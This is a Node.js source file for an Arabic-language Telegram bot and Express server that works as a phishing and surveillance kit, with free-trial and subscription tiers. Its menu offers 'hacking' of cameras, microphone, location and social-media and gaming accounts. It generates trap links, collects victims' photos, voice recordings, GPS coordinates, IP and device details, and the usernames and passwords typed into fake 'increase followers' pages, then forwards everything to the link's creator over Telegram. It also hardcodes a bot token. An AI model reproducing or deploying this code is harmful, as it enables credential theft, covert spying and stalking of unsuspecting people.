const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const useragent = require('useragent');

const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
const bot = new TelegramBot(botToken, { polling: true });

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, 'uploads')));
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const platformVisits = {};
const userVisits = {};
const MAX_FREE_ATTEMPTS = 3; // تحديد عدد المحاولات المجانية
const subscribedUsers = new Set(); // مجموعة المستخدمين المشتركين
const freeTrialEndedMessage = "انتهت فترة التجربة المجانية"; // رسالة نهاية الفترة التجريبية
const adminId = '7130416076';
const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];

function handleAdminCommands(chatId, text) {
  try {
    if (text.startsWith('/ban')) {
      const userIdToBan = text.split(' ')[1];
      if (userIdToBan) {
        banUser(userIdToBan);
        bot.sendMessage(chatId, `تم حظر المستخدم ${userIdToBan}`);
        recordBanAction(userIdToBan, chatId); // سجل حظر المستخدم
      } else {
        bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /ban <user_id>');
      }
      return true;
    } else if (text.startsWith('/unban')) {
      const userIdToUnban = text.split(' ')[1];
      if (userIdToUnban) {
        unbanUser(userIdToUnban);
        bot.sendMessage(chatId, `تم إلغاء حظر المستخدم ${userIdToUnban}`);
      } else {
        bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /unban <user_id>');
      }
      return true;
    } else if (text === '/stats') {
      const totalUsers = Object.keys(allUsers).length;
      const activeUsers = Object.keys(activatedUsers).length;
      const bannedUsersCount = Object.keys(bannedUsers).length;
      const usersWhoBlockedBot = Object.values(allUsers).filter(user => user.hasBlockedBot).length;

      bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
      return true;
    } else if (text.startsWith('/sagd')) {
      const message = text.slice('/sagd '.length);
      if (message) {
        broadcastMessage(message);
        bot.sendMessage(chatId, 'تم إرسال الرسالة بنجاح!');
      } else {
        bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /broadcast <message>');
      }
      return true;
    } else if (text === '/abo') {
      const bannedUsersList = Object.keys(bannedUsers).join(', ');
      bot.sendMessage(chatId, `قائمة المستخدمين المحظورين: ${bannedUsersList}`);
      return true;
    }
  } catch (error) {
    bot.sendMessage(chatId, 'حدث خطأ أثناء معالجة الأمر. يرجى المحاولة لاحقًا.');
    console.error('خطأ أثناء معالجة الأمر:', error);
  }
  return false;
}

function recordBanAction(userId, adminId) {
  const adminName = getUsername(adminId); // استرجاع اسم المسؤول
  bannedUsers[userId] = adminName; // تسجيل اسم المسؤول الذي قام بالحظر
  saveData();
}

// دالة لاسترداد اسم المسؤول
function getUsername(userId) {
  return allUsers[userId]?.username || 'Unknown';
}

// دالة لتحديث حالة حظر المستخدم للبوت
function updateUserBlockStatus(userId, hasBlocked) {
  if (allUsers[userId]) {
    allUsers[userId].hasBlockedBot = hasBlocked;
  } else {
    allUsers[userId] = { hasBlockedBot: hasBlocked };
  }
  saveData();
}

// مستمع لحدث مغادرة العضو
bot.on('left_chat_member', (msg) => {
  const userId = msg.left_chat_member.id;
  if (!msg.left_chat_member.is_bot) {
    updateUserBlockStatus(userId, true); // تحديث حالة حظر البوت للمستخدم
  }
});

// مستمع لحظر البوت من قبل المستخدم
bot.on('my_chat_member', (msg) => {
  if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
    const userId = msg.from.id;
    updateUserBlockStatus(userId, true); // تحديث حالة حظر البوت للمستخدم
  }
});



// دوال لحظر وإلغاء حظر المستخدمين
function banUser(chatId) {
  bannedUsers[chatId] = true;
  saveData();
}

function unbanUser(chatId) {
  delete bannedUsers[chatId];
  saveData();
}

// دالة لإرسال رسالة جماعية
function broadcastMessage(message) {
  Object.keys(allUsers).forEach((userId) => {
    if (!bannedUsers[userId]) {
      bot.sendMessage(userId, message).catch((error) => {
        console.error(`فشل إرسال الرسالة إلى المستخدم ${userId}:`, error);
      });
    }
  });
}

// دالة لإضافة مستخدم إلى القائمة
function addUser(user) {
  if (!allUsers[user.id]) {
    allUsers[user.id] = user;
    saveData();
  }
}

// دالة لحظر مستخدم
function banUser(userId) {
  const user = allUsers[userId];
  if (user && !bannedUsers[userId]) {
    bannedUsers[userId] = user;
    saveData();
  }
}

// دالة لتفعيل مستخدم
function activateUser(userId) {
  const user = allUsers[userId];
  if (user && !activatedUsers[userId]) {
    activatedUsers[userId] = user;
    saveData();
  }
}

// معالجة الرسائل الواردة
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text ? msg.text.toLowerCase() : '';
  const senderId = msg.from.id;
  const firstName = msg.from.first_name;
  const lastName = msg.from.last_name || '';
  const username = msg.from.username || '';

  // تسجيل المستخدمين الجدد
  if (!allUsers[chatId]) {
    allUsers[chatId] = {
      firstName: firstName,
      lastName: lastName,
      username: username
    };
    saveData();
    bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${firstName} ${lastName}\nاسم المستخدم: @${username}\nمعرف الدردشة: ${chatId}`);
  }

  // معالجة أوامر المدير
  if (senderId == adminId) {
    if (handleAdminCommands(chatId, text)) return;
  }

  // حظر المستخدمين المحظورين
  if (bannedUsers[chatId]) {
    bot.sendMessage(chatId, 'لا يمكنك استخدام البوت مرة أخرى. \nإذا رغبت في استخدام البوت مرة أخرى، قُم بالتواصل مع المطور @SAGD112');
    return;
  }

  // التحقق من عضوية القناة المطلوبة
if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
    for (const channel of forcedChannelUsernames) {
        try {
            const member = await bot.getChatMember(channel, chatId);
            if (member.status === 'left' || member.status === 'kicked') {
                bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
                    reply_markup: {
                        inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
                    }
                });
                return;
            }
        } catch (error) {
            console.error('خطأ أثناء التحقق من عضوية القناة:', error);
            bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
            return;
        }
    }
}



// دالة لتتبع المحاولات للمسارات الأخرى
const trackAttempts = (userId, action) => {
    if (!userVisits[userId]) {
        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
    }

    userVisits[userId][action]++;

    return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
};

// دالة لتتبع المحاولات لمسار المنصة الأصلي
const trackPlatformAttempts = (platformId) => {
    if (!platformVisits[platformId]) {
        platformVisits[platformId] = 0;
    }

    platformVisits[platformId]++;

    return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
};

// المسار الأصلي


// مسار الكاميرا
app.get('/camera/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'location.html'));
        return;
    }

    if (trackAttempts(userId, 'camera')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'location.html'));
});

// مسار تسجيل الصوت
app.get('/record/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'record.html'));
        return;
    }

    if (trackAttempts(userId, 'voiceRecord')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'record.html'));
});

// مسار الحصول على الموقع
app.get('/getLocation/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'SJGD.html'));
        return;
    }

    if (trackAttempts(userId, 'getLocation')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'SJGD.html'));
});

app.get('/:platform/:chatId', (req, res) => {
    const { platform, chatId } = req.params;

    if (subscribedUsers.has(chatId)) {
        res.sendFile(path.join(__dirname, 'uploads', `${platform}_increase.html`));
        return;
    }

    if (trackPlatformAttempts(chatId)) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'uploads', `${platform}_increase.html`));
});


// استلام الصور
app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const chatId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${chatId}`);

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            for (const file of files) {
                await bot.sendPhoto(chatId, file.buffer, { caption });
            }
            console.log('Photos sent successfully');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});

// استلام الصوت
app.post('/submitVoice', upload.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voiceFile = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    if (!voiceFile) {
        console.error('No voice file received');
        return res.status(400).json({ error: 'No voice file received' });
    }

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    bot.sendVoice(chatId, voiceFile.buffer, { caption })
        .then(() => {
            console.log('Voice sent successfully');
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending voice:', error);
            res.status(500).json({ error: 'Failed to send voice message' });
        });
});

// استلام الموقع
app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData } = req.body;

    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    try {
        await bot.sendLocation(chatId, latitude, longitude);
        
        const message = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
متصفح المستخدم: ${additionalData.userAgent}
مستوى البطارية: ${additionalData.batteryLevel}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا'}
        `;
        
        await bot.sendMessage(chatId, message);
        console.log('Location and additional data sent successfully');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location', details: error.message });
    }
});

app.post('/submitIncrease', (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;

    console.log('Received ', { username, password, platform, chatId, ip, country, city });
    
    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = useragent.parse(userAgent);

    bot.sendMessage(chatId, `تم تلقي بيانات زيادة المتابعين:
منصة: ${platform}
اسم المستخدم: ${username}
كلمة السر: ${password}
عنوان IP: ${ip}
الدولة: ${country}
المدينة: ${city}
نظام التشغيل: ${deviceInfo.os.toString()}
المتصفح: ${deviceInfo.toAgent()}
الجهاز: ${deviceInfo.device.toString()}`)
        .then(() => {
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending message:', error);
            res.status(500).json({ error: 'Failed to send increase data', details: error.message });
        });
});

// أوامر البوت
bot.onText(/\/sjgd (\d+)/, (msg, match) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const userId = match[1];
    if (subscribedUsers.add(userId)) {
        bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
    } else {
        bot.sendMessage(msg.chat.id, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
    }
});

bot.onText(/\/unsubscribe (\d+)/, (msg, match) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const userId = match[1];
    if (subscribedUsers.delete(userId)) {
        bot.sendMessage(msg.chat.id, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
    } else {
        bot.sendMessage(msg.chat.id, `المستخدم ${userId} غير موجود في قائمة المشتركين.`);
    }
});

bot.onText(/\/listsubscribers/, (msg) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const subscribersList = Array.from(subscribedUsers).join('\n');
    bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! اختر إحدى الخيارات التالية:';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
                [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
                [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
                [{ text: '☠️اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
                [{ text: '🕷اختراق الانستغرام🕷', callback_data: 'increase_instagram' }],
                [{ text: '🔱اختراق الفيسبوك🔱', callback_data: 'increase_facebook' }],
                [{ text: ' 👻 اختراق سناب شات 👻 ', callback_data: 'increase_snapchat' }],
                [{ text: '🔫اختراق حسابات ببجي🔫', callback_data: 'pubg_uc' }],
                [{ text: '🔴اختراق يوتيوب🔴', callback_data: 'increase_youtube' }],
                [{ text: '🐦اختراق تويتر🐦', callback_data: 'increase_twitter' }],
                [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
                [{ text:'سجاد  تتواصل مع المطور', url: 'https://t.me/SAGD112' }]
            ]
        }
    });
});



bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'front_camera' || data === 'rear_camera') {
        const url = `https://silky-triangular-parade.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
    } else if (data === 'voice_record') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
    } else if (data === 'get_location') {
        const url = `https://silky-triangular-parade.glitch.me/getLocation/${chatId}`;
        console.log('Data received:', data);
        console.log('Chat ID:', chatId);
        console.log('URL:', url);
        
        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`)
            .then(() => console.log('Message sent successfully'))
            .catch(err => console.error('Error sending message:', err));
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const duration = parseInt(msg.text, 10);

    if (!isNaN(duration)) {
        if (duration > 0 && duration <= 20) {
            const link = `https://silky-triangular-parade.glitch.me/record/${chatId}?duration=${duration}`;
            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
        } else {
            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
        }
    }
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const baseUrl = 'https://silky-triangular-parade.glitch.me/'; // Change this to your actual URL

    let url;
    switch (query.data) {
        case 'increase_tiktok':
            url = `${baseUrl}/tiktok/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التيك توك: ${url}`);
            break;
        case 'increase_instagram':
            url = `${baseUrl}/instagram/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الانستغرام: ${url}`);
            break;
        case 'increase_facebook':
            url = `${baseUrl}/facebook/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الفيسبوك: ${url}`);
            break;
        case 'increase_snapchat':
            url = `${baseUrl}/snapchat/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق السناب شات: ${url}`);
            break;
        case 'pubg_uc':
            url = `${baseUrl}/pubg_uc/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق بوبجي: ${url}`);
            break;
        case 'increase_youtube':
            url = `${baseUrl}/youtube/${chatId}`;
            bot.sendMessage(chatId, ` تم تلغيم رابط اختراق اليوتيوب: ${url}`);
            break;
        case 'increase_twitter':
            url = `${baseUrl}/twitter/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التويتر: ${url}`);
            break;
    }
});


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
